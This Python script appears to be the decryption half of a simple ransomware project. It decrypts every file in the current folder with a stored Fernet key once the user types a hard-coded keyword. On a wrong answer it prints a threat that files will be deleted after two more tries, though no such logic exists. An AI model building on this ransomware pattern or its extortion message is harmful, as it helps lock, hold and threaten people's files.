import os
from cryptography.fernet import Fernet

filesDir = [] 

for file in os.listdir():
    if file == "encrypt.py" or file == "encrypt.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        filesDir.append(file)



with open("encrypt.key", "rb") as key:
    decryptkey = key.read()

keyword = "Project"

user_input = input("Enter the keyword to decrypt your files\n")

if user_input == keyword:
        for file in filesDir:
                with open(file, "rb") as thefile:
                    contents = thefile.read()
                contents_decrypted = Fernet(decryptkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(contents_decrypted)
                print("Enjoy your Day!!!")
else:
        print("Sorry, thats not right keyword you have two more try left otherwise all your important files will be deleted")
                

